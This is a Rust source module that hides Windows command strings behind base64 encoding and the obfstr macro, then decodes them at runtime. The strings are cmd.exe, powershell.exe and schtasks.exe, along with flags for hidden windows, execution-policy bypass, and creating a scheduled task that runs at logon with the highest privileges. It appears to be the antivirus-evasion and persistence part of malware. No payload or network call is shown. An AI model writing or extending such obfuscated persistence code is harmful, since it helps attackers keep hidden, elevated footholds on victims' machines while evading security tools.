use base64::{engine::general_purpose, Engine as _};
use obfstr::obfstr;

fn decode_b64(encoded: &str) -> String {
    general_purpose::STANDARD
        .decode(encoded.as_bytes())
        .map(|bytes| String::from_utf8_lossy(&bytes).to_string())
        .unwrap_or_default()
}

// Executable names
pub mod exe {
    use super::*;

    /// cmd.exe
    /// base64: Y21kLmV4ZQ==
    pub fn cmd() -> String {
        decode_b64(obfstr!("Y21kLmV4ZQ=="))
    }

    /// powershell.exe
    /// base64: cG93ZXJzaGVsbC5leGU=
    pub fn powershell() -> String {
        decode_b64(obfstr!("cG93ZXJzaGVsbC5leGU="))
    }

    /// schtasks.exe
    /// base64: c2NodGFza3MuZXhl
    pub fn schtasks() -> String {
        decode_b64(obfstr!("c2NodGFza3MuZXhl"))
    }
}

// PowerShell arguments and commands
pub mod powershell {
    use super::*;

    /// -NoProfile
    /// base64: LU5vUHJvZmlsZQ==
    pub fn no_profile() -> String {
        decode_b64(obfstr!("LU5vUHJvZmlsZQ=="))
    }

    /// -WindowStyle
    /// base64: LVdpbmRvd1N0eWxl
    pub fn window_style() -> String {
        decode_b64(obfstr!("LVdpbmRvd1N0eWxl"))
    }

    /// Hidden
    /// base64: SGlkZGVu
    pub fn hidden() -> String {
        decode_b64(obfstr!("SGlkZGVu"))
    }

    /// -ExecutionPolicy
    /// base64: LUV4ZWN1dGlvblBvbGljeQ==
    pub fn execution_policy() -> String {
        decode_b64(obfstr!("LUV4ZWN1dGlvblBvbGljeQ=="))
    }

    /// Bypass
    /// base64: QnlwYXNz
    pub fn bypass() -> String {
        decode_b64(obfstr!("QnlwYXNz"))
    }

    /// -Command
    /// base64: LUNvbW1hbmQ=
    pub fn command() -> String {
        decode_b64(obfstr!("LUNvbW1hbmQ="))
    }

    /// -NonInteractive
    /// base64: LU5vbkludGVyYWN0aXZl
    pub fn non_interactive() -> String {
        decode_b64(obfstr!("LU5vbkludGVyYWN0aXZl"))
    }
}

// Common arguments
pub mod args {
    use super::*;

    /// /f
    /// base64: L2Y=
    pub fn force() -> String {
        decode_b64(obfstr!("L2Y="))
    }

    /// /query
    /// base64: L3F1ZXJ5
    pub fn query() -> String {
        decode_b64(obfstr!("L3F1ZXJ5"))
    }

    /// /tn
    /// base64: L3Ru
    pub fn task_name() -> String {
        decode_b64(obfstr!("L3Ru"))
    }

    /// /create
    /// base64: L2NyZWF0ZQ==
    pub fn create() -> String {
        decode_b64(obfstr!("L2NyZWF0ZQ=="))
    }

    /// /tr
    /// base64: L3Ry
    pub fn task_run() -> String {
        decode_b64(obfstr!("L3Ry"))
    }

    /// /sc
    /// base64: L3Nj
    pub fn schedule() -> String {
        decode_b64(obfstr!("L3Nj"))
    }

    /// onlogon
    /// base64: b25sb2dvbg==
    pub fn onlogon() -> String {
        decode_b64(obfstr!("b25sb2dvbg=="))
    }

    /// /rl
    /// base64: L3Js
    pub fn run_level() -> String {
        decode_b64(obfstr!("L3Js"))
    }

    /// highest
    /// base64: aGlnaGVzdA==
    pub fn highest() -> String {
        decode_b64(obfstr!("aGlnaGVzdA=="))
    }
}
